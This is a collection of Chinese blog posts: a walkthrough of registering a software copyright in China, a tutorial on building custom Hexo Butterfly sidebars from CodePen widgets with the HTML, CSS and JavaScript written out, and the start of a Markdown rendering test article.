<p>以下是一张未改版前宝贵截图：</p>
<img src="https://cdn.gallery.uuanqin.top/img/image-20230601120140239.png" alt="image-20230601120140239" style="zoom:50%;" />
<h1>注册账号并实名认证（新用户）</h1>
<p>首先登录官网 <a href="https://www.ccopyright.com.cn/">中国版权保护中心 (ccopyright.com.cn)</a> 注册账号。</p>
<p>注册成功后会有实名认证提示，也可以在账号管理 -&gt;实名认证处进行认证。</p>
<p>需要准备好：身份证人像照、身份证国徽照、手持身份证自拍三张电子照片，要上传。</p>
<blockquote>
<p>实名认证填写的信息要和照片相符，不管你实际户籍移到哪里，身份证上写你是哪里的就填哪里的。我就是因为这个原因被“退货”了一下。</p>
</blockquote>
<p>认证失败也没关系，修正好资料就行。</p>
<h1>准备好文档</h1>
<p>请详细阅读：<a href="https://www.ccopyright.com.cn/index.php?optionid=1080">所需文件-中国版权保护中心 (ccopyright.com.cn)</a></p>
<p>我准备的材料：</p>
<ul>
<li>文档鉴别材料 pdf x1 份</li>
<li>源代码 pdf x1 份</li>
</ul>
<p>再提醒一些注意事项：</p>
<ul>
<li>除封面外每页有页眉，页眉标文章标题</li>
<li>右上角为页码</li>
<li>版本号 1.0、V1.0 要分清</li>
<li>格式为 pdf</li>
</ul>
<p>源代码文档如何保证一页 50 行：</p>
<ul>
<li>
<p>查看行数：word 中全选一页内容，点击左下角字数统计信息查看</p>
<img src="https://cdn.gallery.uuanqin.top/img/image-20230531183332051.png" alt="image-20230531183332051" style="zoom: 80%;" />
</li>
<li>
<p>格式：字体 Time New Roman 五号，间距 固定值 13.9 磅</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230531183623863.png" alt="image-20230531183623863"></p>
</li>
</ul>
<p>页眉设置分享：</p>
<ul>
<li>
<p>Word 中页眉“文档标题和页码同时存在”的设置方法：双击页眉进入页眉编辑后，输入文章标题。打开菜单：插入 -&gt;页码当前位置，即可插入页码。控制空格使得页码和页眉同时存在。</p>
</li>
<li>
<p>Latex 页眉。因为我是套用 TJU 论文模板的，我也搞不清楚，弄着弄着就得了：</p>
<pre><code class="language-latex">\pagestyle{fancy}                             	% 设置正文眉页脚风格
    \fancyhead[R]{\thepage}            			% 页眉格式
    \fancyhead[C]{XXX系统~V1.0~设计文档}
    \fancyhead[L]{}
    \fancyfoot[C]{}           					% 页脚格式
    \renewcommand{\headrulewidth}{0.5pt}
    \renewcommand{\footrulewidth}{0pt}

\fancypagestyle{plain}{					% 设置章首眉页脚风格
  \pagestyle{fancy}{
    \fancyhead[R]{\thepage}           	% 页眉格式
    \fancyhead[C]{XXX系统~V1.0~设计文档}
    \fancyhead[L]{}
    \fancyfoot[C]{}           			% 页脚格式
    \renewcommand{\headrulewidth}{0.5pt}
    \renewcommand{\footrulewidth}{0pt}
  }
</code></pre>
</li>
</ul>
<h1>网上申请</h1>
<p>按提示填好信息。</p>
<p>申请完成后，会有打印签章页环节（2023 年 6 月新流程）。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20230601114103.png" alt="QQ截图20230601114103.png"></p>
<img src="https://cdn.gallery.uuanqin.top/img/image-20230601121053373.png" alt="image-20230601121053373" style="zoom:67%;" />
<p>我的做法是现在签章页后使用电子签名，之后上传并提交申请就行。</p>
<img src="https://cdn.gallery.uuanqin.top/img/image-20230601142559534.png" alt="image-20230601142559534" style="zoom:80%;" />
<blockquote>
<p>注意到，新版本中删除申请更方便了</p>
</blockquote>
<p>20 天后进入受理流程：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230622110009.png" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230622110043.png" alt="image.png"></p>
<h1>接收</h1>
<p>经过漫长的等待，与 2023 年 8 月 1 日受理并审查完成，不过它颁发的是一个电子件。怪不得之前整个 7 月份查看时收件人地址变得不可更改了，最后直接就消失了。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230801215656.png" alt="image.png"></p>
<p>这么说来整个无纸化流程方便很多，我也算是第一批使用新流程的用户了吧。</p>
<p>当当当当！</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/rzzz.jpg" alt="rzzz.jpg"></p>
<h1>后记</h1>
<p>注意到网站 Logo 换了，丑了。由于网站处于改版期，整个网站功能板块、交互、界面半新半旧的，弄得我好别扭。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230801221819.png" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20230801221807.png" alt="image.png"></p>
<p>看了通知，原来是热乎的 [^hot]。</p>
<p>[^hot]: <a href="https://www.ccopyright.com.cn/index.php?optionid=998&amp;method=view&amp;optionid=998&amp;auto_id=1026">中国版权保护中心发布新形象标识-中心公告-中国版权保护中心 (ccopyright.com.cn)</a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://www.zhihu.com/search?q=%E4%B8%AA%E4%BA%BA%E7%94%B3%E8%AF%B7%E8%BD%AF%E4%BB%B6%E8%91%97%E4%BD%9C%E6%9D%83&amp;utm_content=search_history&amp;type=content">个人申请软件著作权 - 搜索结果 - 知乎 (zhihu.com)</a></li>
<li><a href="https://github.com/zephms/ccopyright-software-copyright-application/tree/main">zephms/ccopyright-software-copyright-application: 中国版权保护中心 软件著作权申请教程 (github.com)</a></li>
<li><a href="https://zhidao.baidu.com/question/274830328.html">如何让页眉和页码同时显示_百度知道 (baidu.com)</a></li>
<li><a href="https://blog.csdn.net/m0_57028150/article/details/129690954">latex 章首添加页眉<em>latex 首页页眉</em>玛莎拉蒂的车轮的博客-CSDN 博客</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/114676221">Latex 的页脚和页眉 - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="90746120" class="record">
            <header>
                <h1 class="record-title">Butterfly 不改动主题源码实现自定义侧边栏</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>博客相关, Hexo</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('HTML');">HTML</button>
                    
                    <button class="btn" onclick="activeTag('CSS');">CSS</button>
                    
                    <button class="btn" onclick="activeTag('Butterfly');">Butterfly</button>
                    
                    <button class="btn" onclick="activeTag('Pug');">Pug</button>
                    
                    <button class="btn" onclick="activeTag('CodePen');">CodePen</button>
                    
                    <button class="btn" onclick="activeTag('YAML');">YAML</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/1/2023</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/crowdcover46546.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>侧边栏定制举一反三，手把手教你实现自己的侧边栏</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>568ad08</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!success] 本文已收录至 <a href="https://butterfly.zhheo.com/">Butterfly 主题美化教程</a></p>
</blockquote>
<p>侧边栏是 Butterfly 主题的一大功能亮点，在 Butterfly 3.8.0 版本前是不支持自定义侧边栏的，只能通过魔改实现。这也因此诞生了许多优质的魔改教程，效果也很惊艳，比如 <a href="https://blog.zhheo.com/">Heo</a> 收录的：<a href="https://butterfly.zhheo.com/docs/aside.html">侧边栏 | Butterfly 主题美化教程 (zhheo.com)</a>。</p>
<p>Butterfly 3.8.0 以后，主题支持自定义侧边栏，这也使我们可以通过不修改主题源码的方式自定义想要的侧边栏。（主题官方文档参考：<a href="https://butterfly.js.org/posts/ea33ab97/">自定義側邊欄 | Butterfly</a>）</p>
<p><strong>授人以鱼不如授人以渔</strong>。本篇文章将以这个特性为基础，结合 CodePen 中的项目，以三个例子展示定制侧边栏过程：</p>
<ul>
<li>小风车：这是对主题官方文档示例的举一反三，提供与 CodePen 项目结合的思路。<br>
<img src="https://cdn.gallery.uuanqin.top/img/image-20230530224311630.png" alt="image-20230530224311630|223"></li>
<li>Crowd Simulator 人潮涌动模拟器：引入 CSS 文件去掉侧边栏容器的边框，嵌入 iframe 页面<br>
<img src="https://cdn.gallery.uuanqin.top/img/crowdsimudemo.gif" alt="crowdsimudemo.gif"></li>
<li>Car 小汽车：上例的举一反三<br>
<img src="https://cdn.gallery.uuanqin.top/img/cardemo-min.gif" alt="cardemo-min.gif|275"></li>
</ul>
<blockquote>
<p>本人前端水平有限，欢迎各位博主互相交流！</p>
</blockquote>
<h1>小风车</h1>
<p>首先，在 <a href="https://codepen.io/trending">Trending - CodePen</a> 找到自己想要的小组件，以小风车为例 <a href="https://codepen.io/FilipVitas/pen/zWWmbo">Windmill (codepen.io)</a>，进入代码编辑界面，里面有 HTML 代码和 CSS 代码。</p>
<h2>引入 CSS</h2>
<p>点击代码框右上小箭头，编译 css 文件：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230530222130344.png" alt="image-20230530222130344|500"></p>
<p>复制里面的的代码到新文件 windmill.css。并将该 CSS 文件引入主题中。Butterfly 主题的方法为在主题配置文件的 inject 部分引入 CSS，如：</p>
<pre><code class="language-yaml">inject:
  head:
    - &lt;link rel=&quot;stylesheet&quot; href=&quot;your css&quot;&gt;
  bottom:
    - &lt;script src=&quot;your js&quot;&gt;&lt;/script&gt;
</code></pre>
<p>删除不必要代码（否则导致博客异常）并稍微修改一下类选择器（以防万一）：</p>
<pre><code class="language-diff">- *,
- *:before,
- *:after {
-   ...
- }
- body {
-   ...
- }
- .inspiration {
- 	...
- }
- .center {
- ...
- }
- @media screen and (max-height: 500px) {
- ...
- }
+ /* 这是为了让svg居中 */
+ .windmill {
+     display: flex;
+     align-items: center;
+     justify-content: center;
+ }

+ /* 以下关于svg类选择器加上.windmill */
- svg {
+ svg.windmill {
  overflow: visible;
}
- svg .blades {
+ svg .blades.windmill {
	...
}
- svg .clouds path:nth-child(1) {
+ svg .clouds.windmill path:nth-child(1) {
	...
}
- svg .clouds path:nth-child(2) {
+ svg .clouds.windmill path:nth-child(2) {
	...
}
...
</code></pre>
<h2>widget.yml 放入关键 HTML 代码</h2>
<p>只提取代码中第一个 div 元素，并对相关元素增加 windmill 类：</p>
<pre><code class="language-diff">-&lt;div class=&quot;center&quot;&gt;
+&lt;div class=&quot;windmill&quot;&gt;
-  &lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;615.66 311.71 271.03 207.66&quot; width=&quot;271.03&quot; height=&quot;207.66&quot;&gt;
-   &lt;g class=&quot;clouds&quot; fill=&quot;none&quot; stroke-width=&quot;3&quot; stroke=&quot;#BED3CF&quot; stroke-linejoin=&quot;round&quot; stroke-linecap=&quot;round&quot; stroke-miterlimit=&quot;3&quot;&gt;
+ &lt;svg class=&quot;windmill&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;615.66 311.71 271.03 207.66&quot; width=&quot;271.03&quot; height=&quot;207.66&quot;&gt;
+ &lt;g class=&quot;clouds windmill&quot; fill=&quot;none&quot; stroke-width=&quot;3&quot; stroke=&quot;#BED3CF&quot; stroke-linejoin=&quot;round&quot; stroke-linecap=&quot;round&quot; stroke-miterlimit=&quot;3&quot;&gt;
        ...
    &lt;/g&gt;
	...
- &lt;g class=&quot;blades&quot; fill=&quot;#FFF&quot; stroke-width=&quot;3&quot; stroke=&quot;#4A5370&quot; stroke-linejoin=&quot;round&quot; stroke-miterlimit=&quot;3&quot;&gt;
+ &lt;g class=&quot;blades windmill&quot; fill=&quot;#FFF&quot; stroke-width=&quot;3&quot; stroke=&quot;#4A5370&quot; stroke-linejoin=&quot;round&quot; stroke-miterlimit=&quot;3&quot;&gt;
	...
  &lt;/g&gt;
&lt;/svg&gt;
&lt;/div&gt;
</code></pre>
<p>在 widget.yml 中是这样的：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20230530223905933.png" alt="image-20230530223905933|500"></p>
<p>注意 YAML 文件中的缩进！否则会报这样的错误：</p>
<pre><code>can not read a block mapping entry; a multiline key may not be an implicit key
</code></pre>
<h1>Crowd Simulator 人潮涌动模拟器</h1>
<p>逛了许多博主的网站，发现了这个卡片：<a href="https://codepen.io/zadvorsky/pen/xxwbBQV">Crowd Simulator (codepen.io)</a>。想尝试一下是不是可以放到侧边栏，试了一晚上成功了。现分享步骤。</p>
<h2>新建 HTML 文件</h2>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;

&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;人潮汹涌 Crowd Simulator&lt;/title&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/people.css&quot;&gt;
&lt;/head&gt;

&lt;body&gt;&lt;canvas id=&quot;canvas&quot;&gt;&lt;/canvas&gt;
    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/gsap/3.9.1/gsap.min.js&quot;&gt;&lt;/script&gt;
&lt;/body&gt;

&lt;style&gt;
    body,
    html {
        height: 100%;
        background-color: #fff
    }

    body {
        margin: 0
    }

    #canvas {
        width: 100%;
        height: 100%
    }

    body::-webkit-scrollbar {
        display: none
    }

&lt;/style&gt;

&lt;script&gt;

const config = {
  src:
    &quot;https://s3-us-west-2.amazonaws.com/s.cdpn.io/175711/open-peeps-sheet.png&quot;,
  rows: 15,
  cols: 7
};

// UTILS

const randomRange = (min, max) =&gt; min + Math.random() * (max - min);

const randomIndex = (array) =&gt; randomRange(0, array.length) | 0;

const removeFromArray = (array, i) =&gt; array.splice(i, 1)[0];

const removeItemFromArray = (array, item) =&gt;
  removeFromArray(array, array.indexOf(item));

const removeRandomFromArray = (array) =&gt;
  removeFromArray(array, randomIndex(array));

const getRandomFromArray = (array) =&gt; array[randomIndex(array) | 0];

// TWEEN FACTORIES

const resetPeep = ({ stage, peep }) =&gt; {
  const direction = Math.random() &gt; 0.5 ? 1 : -1;
  // using an ease function to skew random to lower values to help hide that peeps have no legs
  const offsetY = 100 - 250 * gsap.parseEase(&quot;power2.in&quot;)(Math.random());
  const startY = stage.height - peep.height + offsetY;
  let startX;
  let endX;

  if (direction === 1) {
    startX = -peep.width;
    endX = stage.width;
    peep.scaleX = 1;
  } else {
    startX = stage.width + peep.width;
    endX = 0;
    peep.scaleX = -1;
  }

  peep.x = startX;
  peep.y = startY;
  peep.anchorY = startY;

  return {
    startX,
    startY,
    endX
  };
};

const normalWalk = ({ peep, props }) =&gt; {
  const { startX, startY, endX } = props;

  const xDuration = 10;
  const yDuration = 0.25;

  const tl = gsap.timeline();
  tl.timeScale(randomRange(0.5, 1.5));
  tl.to(
    peep,
    {
      duration: xDuration,
      x: endX,
      ease: &quot;none&quot;
    },
    0
  );
  tl.to(
    peep,
    {
      duration: yDuration,
      repeat: xDuration / yDuration,
      yoyo: true,
      y: startY - 10
    },
    0
  );

  return tl;
};

const walks = [normalWalk];

// CLASSES

class Peep {
  constructor({ image, rect }) {
    this.image = image;
    this.setRect(rect);

    this.x = 0;
    this.y = 0;
    this.anchorY = 0;
    this.scaleX = 1;
    this.walk = null;
  }

  setRect(rect) {
    this.rect = rect;
    this.width = rect[2];
    this.height = rect[3];

    this.drawArgs = [this.image, ...rect, 0, 0, this.width, this.height];
  }

  render(ctx) {
    ctx.save();
    ctx.translate(this.x, this.y);
    ctx.scale(this.scaleX, 1);
    ctx.drawImage(...this.drawArgs);
    ctx.restore();
  }
}

// MAIN

const img_crowd = document.createElement(&quot;img&quot;);
img_crowd.onload = init;
img_crowd.src = config.src;

const canvas = document.querySelector(&quot;#canvas&quot;);
const ctx = canvas.getContext(&quot;2d&quot;);

const stage = {
  width: 0,
  height: 0
};

var allPeeps = [];
const availablePeeps = [];
const crowd = [];

function init() {
  createPeeps();

  // resize also (re)populates the stage
  resize();

  gsap.ticker.add(render);
  window.addEventListener(&quot;resize&quot;, resize);
}

function createPeeps() {
  const { rows, cols } = config;
  const { naturalWidth: width, naturalHeight: height } = img_crowd;
  const total = rows * cols;
  const rectWidth = width / rows;
  const rectHeight = height / cols;

  for (let i = 0; i &lt; total; i++) {
    allPeeps.push(
      new Peep({
        image: img_crowd,
        rect: [
          (i % rows) * rectWidth,
          ((i / rows) | 0) * rectHeight,
          rectWidth,
          rectHeight
        ]
      })
    );
  }
}

function resize() {
  stage.width = canvas.clientWidth;
  stage.height = canvas.clientHeight;
  canvas.width = stage.width * devicePixelRatio;
  canvas.height = stage.height * devicePixelRatio;

  crowd.forEach((peep) =&gt; {
    peep.walk.kill();
  });

  crowd.length = 0;
  availablePeeps.length = 0;
  availablePeeps.push(...allPeeps);

  initCrowd();
}

function initCrowd() {
  while (availablePeeps.length) {
    // setting random tween progress spreads the peeps out
    addPeepToCrowd().walk.progress(Math.random());
  }
}

function addPeepToCrowd() {
  const peep = removeRandomFromArray(availablePeeps);
  const walk = getRandomFromArray(walks)({
    peep,
    props: resetPeep({
      peep,
      stage
    })
  }).eventCallback(&quot;onComplete&quot;, () =&gt; {
    removePeepFromCrowd(peep);
    addPeepToCrowd();
  });

  peep.walk = walk;

  crowd.push(peep);
  crowd.sort((a, b) =&gt; a.anchorY - b.anchorY);

  return peep;
}

function removePeepFromCrowd(peep) {
  removeItemFromArray(crowd, peep);
  availablePeeps.push(peep);
}

function render() {
  canvas.width = canvas.width;
  ctx.save();
  ctx.scale(devicePixelRatio, devicePixelRatio);

  crowd.forEach((peep) =&gt; {
    peep.render(ctx);
  });

  ctx.restore();
}

&lt;/script&gt;

&lt;/html&gt;

</code></pre>
<p>这个 HTML 模板很简单：</p>
<ul>
<li>body 部分放 <a href="https://codepen.io/zadvorsky/pen/xxwbBQV">Crowd Simulator (codepen.io)</a> 中 HTML 的内容</li>
<li>style 部分放 CSS 内容。增加一点样式隐藏滚动条。</li>
</ul>
<pre><code class="language-css">	body::-webkit-scrollbar {
        display: none
    }
</code></pre>
<ul>
<li>js 做了写优化（我调错调试出来的）
<ul>
<li>引入其他 js：gsap.min.js</li>
<li>改了一个变量名：img-&gt;img_crowd 防冲突</li>
</ul>
</li>
</ul>
<p>将新建的 HTML 放到<strong>你博客目录 Sourse 文件夹</strong>下的合适位置。这里我单独放到 <code>DO_NOT_render</code> 文件夹下，以便后续设置 Hexo 忽略对该文件夹的渲染。注意 <code>DO_NOT_render</code> 文件夹是 <code>sourse</code> 的子文件夹。</p>
<p>在 <code>_config.yaml</code> 中设置禁止渲染：</p>
<pre><code class="language-yaml">skip_render:
  - DO_NOT_render/people.html
</code></pre>
<h2>引入 CSS</h2>
<p>Butterfly 主题配置文件 inject 以下 CSS：</p>
<pre><code class="language-css">#effect_shade{
    /* width:40%!important; */
    height: 200px;
    background-color: var(--lyx-white-acrylic1)!important;
    border-radius: 8px;
    /* margin-right: 10px !important; */
    font-family: PingFang,微软雅黑,HYTMR,SimSun;
    background-size:cover;
    color: #00000000;
    font-size:40px; /*觉得小可以开大一点*/
    position: relative;
}
#effect_shade-banner{
    width:100%!important;
    height:100%!important;
    border-radius:8px;
}
#effect_shade-hover{
    position:absolute;
    right:0%;
    height:100%!important;
    color:var(--lyx-0);
    border-radius: 8px;
    padding-left: 5%;
    padding-top: 5%;
}
#effect_shade-hover:hover{
   color:#ffffff;
   background-color: #669900dd;
   backdrop-filter: blur(10px) saturate(180%);
   -webkit-backdrop-filter: blur(10px) saturate(180%);
}

/* 这是为了无缝侧边栏 */
.seamless-card{
    padding: 0px!important;
}
.seamless-card .item-headline{
    padding-bottom: 0px!important;
    height: 0px!important;
}

</code></pre>
<p>从上面的 CSS 中注意到：</p>
<pre><code class="language-CSS">/* 这是为了无缝侧边栏 */
.seamless-card{
    padding: 0px!important;
}
.seamless-card .item-headline{
    padding-bottom: 0px!important;
    height: 0px!important;
}
</code></pre>
<p>这是为了覆盖 Butterfly 主题侧边栏样式，实现对目标侧边栏卡片进行调整，达到无缝的效果。这部分也可以独立出一个 css 样式文件出来。</p>
<h2>自定义侧边栏 widget.yml</h2>
<blockquote>
<p>[!hint] 再次提醒<br>
关于自定义侧边栏（widget.yml）信息详看 Butterfly 主题官方文档 <a href="https://butterfly.js.org/posts/ea33ab97/#%E6%A0%BC%E5%BC%8F">自定義側邊欄 | Butterfly</a></p>
</blockquote>
<pre><code class="language-yaml">top:
  - class_name: seamless-card
    id_name:
    name:
    icon:
    order:
    html: |
      &lt;div id=&quot;effect_shade&quot;&gt;
      &lt;iframe id=&quot;effect_shade-banner&quot; src=&quot;/DO_NOT_render/people.html&quot; frameborder=&quot;no&quot;&gt;&lt;/iframe&gt;
      &lt;a id=&quot;effect_shade-hover&quot; style=&quot;width:100%;height:auto;&quot; href=&quot;javascript:randomPost()&quot;&gt;
          &lt;span&gt;&amp;nbsp&lt;/span&gt;&lt;i class=&quot;fa fa-paper-plane&quot;&gt;&lt;/i&gt;
        &lt;div&gt;&amp;nbsp随便逛逛→&lt;/div&gt;&lt;/a&gt;
      &lt;/div&gt;
</code></pre>
<p><code>seamless-card</code> 呼应上文的无缝效果。<strong>无边框的关键就在于这</strong>！</p>
<p>注意到，</p>
<pre><code class="language-html">&lt;a id=&quot;random-hover&quot; style=&quot;width:100%;height:auto;&quot; href=&quot;javascript:randomPost()&quot;&gt;
</code></pre>
<p>中的 js 函数为之前写的随机跳转函数 [^ram]，你可以执行你想要的函数。</p>
<p>从这个例子中，我们学到，HTML 是实现画面内容，CSS 是实现鼠标悬停动效，widget.yaml 可以配置侧边栏效果。以这种方式我们很快就能做出第二个例子。</p>
<p>[^ram]: 随机访问一篇文章：<a href="https://blog.leonus.cn/2022/randomPost.html">随机访问一篇文章的实现 | Leonus</a></p>
<h1>Car 小汽车</h1>
<p>项目：<a href="https://codepen.io/abxlfazl/pen/NWrOBzg">car (codepen.io)</a></p>
<p>这个项目里只有 css 代码，那这个页面就简单了。新建 HTML 放入 <code>DO_NOT_render</code> 文件夹。</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;

&lt;html lang=&quot;zh&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;title&gt;小车&lt;/title&gt;
&lt;/head&gt;
&lt;script&gt;
	// 这里放项目的CSS
&lt;/script&gt;
&lt;/html&gt;
</code></pre>
<p>widget.yml 几乎不用变：</p>
<pre><code class="language-diff"> - class_name: seamless-card
    id_name:
    name:
    icon:
    order:
    html: |
      &lt;div id=&quot;effect_shade&quot;&gt;
-     &lt;iframe id=&quot;effect_shade-banner&quot; src=&quot;/DO_NOT_render/people.html&quot; frameborder=&quot;no&quot;&gt;&lt;/iframe&gt;
+     &lt;iframe id=&quot;effect_shade-banner&quot; src=&quot;/DO_NOT_render/car/car.html&quot; frameborder=&quot;no&quot;&gt;&lt;/iframe&gt;
      &lt;a id=&quot;effect_shade-hover&quot; style=&quot;width:100%;height:auto;&quot; href=&quot;javascript:randomPost()&quot;&gt;
          &lt;span&gt;&amp;nbsp&lt;/span&gt;&lt;i class=&quot;fa fa-paper-plane&quot;&gt;&lt;/i&gt;
        &lt;div&gt;&amp;nbsp随便逛逛→&lt;/div&gt;&lt;/a&gt;
      &lt;/div&gt;
</code></pre>
<p>就 OK 了。</p>
<h1>其他侧边栏定制文章</h1>
<p><a href="#4139834099" title="Butterfly 侧边栏实现 Obsidian 关系图谱" class="record-link ">Butterfly 侧边栏实现 Obsidian 关系图谱</a></p>
<h1>本文参考</h1>
<ul>
<li><a href="https://yisous.xyz/posts/bd7ef112/">Hexo butterfly 首页随便逛逛 banner 教程 | Ariasaka の小窝 (yisous.xyz)</a></li>
<li><a href="https://codebeautify.org/pug-to-html-converter">PUG to HTML Converter Online tool (codebeautify.org)</a></li>
<li><a href="https://blog.zhheo.com/p/8148ca95.html">Hexo 魔改：Codepen 项目组件移植教程，将 Codepen 项目移植到博客 | 张洪 Heo (zhheo.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="4139834099">
                            <a href="#4139834099">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 侧边栏实现 Obsidian 关系图谱</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#4139834099" title="Butterfly 侧边栏实现 Obsidian 关系图谱" class="record-link highlight">Butterfly 侧边栏实现 Obsidian 关系图谱</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">2</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="4139834099">
                            <a href="#4139834099">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>Butterfly 侧边栏实现 Obsidian 关系图谱</span>
                                
                                <div class="record-links-context hover">
                                    <p>实现无缝侧边栏参考我这篇教程：<a href="#90746120" title="Butterfly 不改动主题源码实现自定义侧边栏" class="record-link highlight">Butterfly 不改动主题源码实现自定义侧边栏</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1215492985">
                            <a href="#1215492985">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_博客相关);">⬤</span>
                                    
                                    <span style="color: var(--n_hexo);">⬤</span>
                                    
                                </span>
                                
                                <span>装点你的 Butterfly 博客</span>
                                
                                <div class="record-links-context hover">
                                    <p>自定义侧边栏：<a href="#90746120" title="Butterfly 不改动主题源码实现自定义侧边栏" class="record-link highlight">Butterfly 不改动主题源码实现自定义侧边栏</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="1011516134" class="record">
            <header>
                <h1 class="record-title">Markdown 渲染测试</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>工具箱, 核心协同</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('源码案例驱动');">源码案例驱动</button>
                    
                    <button class="btn" onclick="activeTag('Markdown');">Markdown</button>
                    
                    <button class="btn" onclick="activeTag('Typora');">Typora</button>
                    
                    <button class="btn" onclick="activeTag('GFM');">GFM</button>
                    
                    <button class="btn" onclick="activeTag('OFM');">OFM</button>
                    
                    <button class="btn" onclick="activeTag('Obsidian');">Obsidian</button>
                    
                    <button class="btn" onclick="activeTag('Microsoft');">Microsoft</button>
                    
                    <button class="btn" onclick="activeTag('Github');">Github</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>6/1/2023</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>3c4a82e6</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/mdcover65465.png</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>以 CommonMark、GFM 标准为基础进行测试。</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <p>【提示：Github 中 Front-matter 以表格形式显示】</p>
<h1>简介</h1>
<h2>文章使用方法</h2>
<p>这原本是一篇 Typora 下使用 Markdown 语法的案例实践分享，最早创建于 2021 年 11 月之前，于 2023 年 6 月大改。本篇文章使用 Markdown 标记语法编写而成，汇聚了常用 Markdown 语法标注。对于不同目标人群有不同的作用：</p>
<ul>
<li>对于 Markdown 学习者。可以获取文章源码（Github 地址如下），并使用你的本地编辑器打开。通过对比标记语言与渲染结果直接学习。如果你不喜欢这种 MarkDown 学习方式，你可以参考 GitHub 学习相关 Markdown 规范：<a href="https://docs.github.com/zh/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax">基本撰写和格式语法 - GitHub 文档</a></li>
<li>对于其他人。这篇文章包含不同标准 Markdown 语法，你可以在任何 Markdown 编辑器打开以测试其渲染效果。
<ul>
<li>比如说——你。你使用什么方式看到这篇文章，就了解到你所用的软件对 Markdown 语言的支持情况。如果你通过我的博客打开，那么你看到的就是 Hexo 渲染后的结果（至少 2023 年时是这样）。</li>
<li>比如说——我，笔记重度依赖。我需要对比本地编辑器的渲染器与 Hexo 各类渲染器和插件对 Markdown 的支持程度，以培养合适的写作习惯，加强核心工作流的可移植性。</li>
</ul>
</li>
</ul>
<p>文章目前可预览的在线版本：</p>
<ul>
<li>Hexo 渲染网页：<a href="https://uuanqin.top/p/3c4a82e6/">Markdown渲染测试 | 半方池水半方田 (uuanqin.top)</a>。源文件直接通过 Hexo 渲染生成的静态网页。</li>
<li>Github 仓库： <a href="https://github.com/uuanqin/Markdown-Grammar-Rendering-Test">https://github.com/uuanqin/Markdown-Grammar-Rendering-Test</a> 。源文件的副本，定期与 Hexo 本地同步。</li>
</ul>
<h2>Markdown 标准</h2>
<p>约翰·格鲁伯在 2004 年创造了 Markdown 语言，<a href="https://daringfireball.net/projects/markdown/">Daring Fireball: Markdown</a>。格鲁伯认为不应完全标准化：“不同的网站（和人们）有不同的需求。没有一种语法可以让所有人满意。[^satisfy]”</p>
<p>[satisfy]: <a href="https://zh.wikipedia.org/wiki/Markdown">Markdown - 维基百科，自由的百科全书 (wikipedia.org)</a></p>
<p>下文将从 Commonmark、GFM 为基础分板块进行 Markdown 渲染测试。</p>
